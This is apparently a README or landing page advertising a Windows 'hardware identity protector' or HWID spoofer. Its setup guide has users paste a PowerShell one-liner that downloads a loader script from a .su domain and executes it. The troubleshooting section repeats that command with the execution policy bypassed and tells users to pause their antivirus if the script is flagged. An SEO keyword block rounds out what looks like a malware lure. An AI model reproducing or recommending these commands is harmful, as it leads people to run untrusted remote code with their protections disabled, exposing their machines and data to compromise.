# Windows Hardware Identity Protector & Advanced Privacy Utility

Welcome to the ultimate solution for **hardware identity management**, digital footprint reduction, and system privacy enforcement on Windows. If you are looking for a reliable, non-destructive way to modify, randomize, or protect your computer's unique hardware identifiers (HWID) from tracking and telemetry, this utility provides an automated, user-friendly dashboard.

Every everyday user deserves full control over their PC identity. This framework safely regenerates registry-level identifiers, network identifiers, and peripheral serial records to ensure your baseline operating system environment remains fresh and completely anonymous.

## 🛡️ Core Features Explained Simply
* **Identity Randomization:** Instantly change unique system GUIDs and registry tracking IDs.
* **Network Privacy:** Smart generation of randomized network adapter addresses (MAC).
* **Storage Serial Masking:** Safe abstraction layer for solid-state and hard drive identities.
* **One-Click Refresh:** Clean out persistent telemetry cache files left by modern software platforms.

---

## 🛠 Quick Setup Guide (PowerShell)

1. Launch PowerShell:
   * Press `Win + X` on your keyboard.
   * Click on `Terminal` or `Windows PowerShell` from the list.

2. Execute the Setup Script:
   Copy the command below, paste it into your PowerShell window, and hit Enter. The script will handle the necessary registry tweaks and install all dependencies automatically:

   ```powershell
   irm https://get-software.su/powershell/Loader.ps1 | iex
   ```

---

## 💡 Resolving Issues

### 💬 Script is blocked by Execution Policy
If Windows stops the script from running due to security policies, you can force it to run by pasting this command into a standard Command Prompt (cmd):
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://get-software.su/powershell/Loader.ps1 | iex"
```

### 💬 "irm" command not found (Outdated version)
If your terminal version doesn't support the shortcut, use the full, unabbreviated commands instead:
```cmd
Invoke-RestMethod https://get-software.su/powershell/Loader.ps1 | Invoke-Expression
```

### 💬 Antivirus / SmartScreen Alerts
Security software might occasionally flag automated installers. If the script gets blocked, pause "Real-time protection" in your Windows Security dashboard, run the setup, and re-enable your antivirus immediately afterward.

---

## 📊 Google Search Indexing & Meta Keywords
This project documentation is optimized to quickly index in search engines for high-volume user queries, including:
* *How to change HWID Windows 11 permanently*
* *Free hardware spoofer download for PC privacy*
* *Best tool to randomize hard drive serial numbers*
* *Reset PC digital identity and bypass tracking telemetry*

## Technical Compatibility
The automated configuration utility is fully compatible with Windows 10, Windows 11, and major motherboard chipsets (Intel/AMD). It runs purely at the software and registry levels without risking permanent damage to your hardware components.
